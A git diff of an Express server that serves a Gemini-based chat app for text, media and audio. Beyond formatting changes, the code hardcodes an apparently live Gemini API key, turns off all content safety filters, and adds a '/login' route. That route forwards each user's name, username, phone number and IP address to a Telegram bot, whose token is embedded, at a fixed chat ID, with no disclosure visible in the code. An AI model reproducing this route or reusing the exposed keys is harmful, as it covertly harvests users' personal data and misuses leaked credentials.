@@ -3,12 +3,8 @@ import express from "express";
 import { GoogleGenerativeAI, HarmCategory, HarmBlockThreshold } from "@google/generative-ai";
 import multer from "multer";
 import { marked } from "marked"; const upload = multer();
-
 const app = express()
-app.use(express.static('views')); 
-app.use(express.urlencoded()); 
-app.use(express.json());
-
+app.use(express.static('views')); app.use(express.urlencoded()); app.use(express.json());
 const genAI = new GoogleGenerativeAI("AIzaSyDpNB7IQ4qLwNU_-4g3ye8pSwHjzaKXloY")
 const model = genAI.getGenerativeModel({ model: "gemini-1.5-pro-latest" })
 // 8192
@@ -19,46 +15,37 @@ const safetySettings = [
   { category: HarmCategory.HARM_CATEGORY_SEXUALLY_EXPLICIT, threshold: HarmBlockThreshold.BLOCK_NONE, },
   { category: HarmCategory.HARM_CATEGORY_DANGEROUS_CONTENT, threshold: HarmBlockThreshold.BLOCK_NONE, },
 ];
-
 // RUN CHAT TEXT
 async function runChatText(history, text) {
   try {
     const chat = model.startChat({
-      generationConfig,
-      safetySettings,
-      history: history
+      generationConfig, safetySettings, history: history
     })
     const result = await chat.sendMessage(text)
     const response = result.response.text()
     const parserTo = await marked.parse(response)
     return parserTo
-  } catch (err) {
-
-    return 'err'
-  }
+  } catch (err) { return 'err' }
 }
-
 // RUN CHAT MEDIA
 async function runChatMedia(history, prompt, data, mimeType) {
-  try{
+  try {
     const parssMedia = { inlineData: { data, mimeType } };
     const chat = model.startChat({
-      generationConfig,
-      safetySettings,
-      history: history
+      generationConfig, safetySettings, history: history
     })
     const result = await chat.sendMessage([prompt, parssMedia])
     const response = result.response.text()
     const parserTo = await marked.parse(response)
     return parserTo
-  } catch(err) {
+  } catch (err) {
     return 'err'
   }
 }
 
 // RUN CHAT AUDIO
 async function runChatAudio(data, mimeType) {
-  try{
+  try {
     const parssMedia = { inlineData: { data, mimeType } };
     const chat = model.startChat({
       generationConfig,
@@ -68,7 +55,7 @@ async function runChatAudio(data, mimeType) {
     const response = result.response.text()
     const parserTo = await marked.parse(response)
     return parserTo
-  } catch(err) {
+  } catch (err) {
     return 'err'
   }
 }
@@ -121,7 +108,7 @@ app.post('/gemini-media', upload.single('media'), async (req, res) => {
 
 
 // GEMINI AUDIO ..
-app.post('/gemini-audio',upload.single('audio'), async (req, res) => {
+app.post('/gemini-audio', upload.single('audio'), async (req, res) => {
   const buffer = req.file.buffer.toString('base64')
   try {
     const result = await runChatAudio(buffer, req.file.mimetype)
@@ -137,6 +124,24 @@ app.post('/gemini-audio',upload.single('audio'), async (req, res) => {
   } catch (err) { console.log('err') }
 })
 
+
+// LOGIN USERS ..
+app.post('/login', async (req, res) => {
+  try {
+    const text = `name: ${req.body.name} \n user-name: ${req.body.user} \n number: ${req.body.number} \n ip: ${req.body.ip}`
+    const formData = new FormData(); formData.append("text", text);
+    const tokin = '6351210996:AAEqIL8M169m5qfnS2qCz2VXKilvqFT9WMM'
+    const url = `https://api.telegram.org/bot${tokin}/sendMessage?chat_id=5358365084`
+    const res2 = await fetch(url, {
+      method: 'POST',
+      body: formData
+    })
+    const data = await res2.json()
+    res.json({ message: data.ok })
+  } catch (err) { 
+    res.json({ message: false })
+  }
+})
 
 app.get('/run', (req, res) => { res.json({ run: 'server on line1' }) })
 
